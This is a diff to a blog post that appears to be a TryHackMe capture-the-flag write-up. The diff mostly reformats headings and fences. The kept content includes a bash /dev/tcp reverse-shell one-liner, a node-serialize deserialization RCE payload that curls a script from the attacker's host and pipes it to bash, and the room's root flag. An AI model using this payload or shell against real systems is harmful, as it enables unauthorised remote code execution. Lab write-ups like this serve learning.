@@ -2,7 +2,9 @@
 layout: post
 title:  "Jax sucks alot"
 date:   2026-11-02 21:05:27 -0500
-categories: writeups
+categories:
+  - writeups
+  - thm
 platform: thm
 level: easy
 points: 60
@@ -47,7 +49,7 @@ PORT   STATE SERVICE REASON         VERSION
 * 22 : ssh
 	
 
-# web :
+## web :
 
 ![Image]({{ site.baseurl }}/images/jason/2.png)
 
@@ -109,14 +111,14 @@ ping my machine to see if we can excute code on the box :
 
 there a tousend way to get a shell rn , to make my life easier i'll : 
 
-- curl a s.sh on my machine with a revshell in it  : ```bash -i &>/dev/tcp/ip/port <&1```
+- curl a s.sh on my machine with a revshell in it  : ````bash -i &>/dev/tcp/ip/port <&1```
 
 payload :
 ````
 {"rce":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('curl http://ip/port/s.sh |bash', function(error, stdout, stderr) { console.log(stdout) });\n }()"}
 ````
 
-# Initial access :
+## Initial access :
 ![Image]({{ site.baseurl }}/images/jason/10.png)
 
 
@@ -129,11 +131,11 @@ i dont know why (yet) , i got root access just by gotting a shell , LOL
 
 ![Image]({{ site.baseurl }}/images/jason/11.png)
 
-# ROOT FLAG :
+## ROOT FLAG :
 ![Image]({{ site.baseurl }}/images/jason/12.png)
 
-**FLAG :**
-```
+**ROOT FLAG :**
+````
 2cd5a9fd3a0024bfa98d01d69241760e
 ```
 
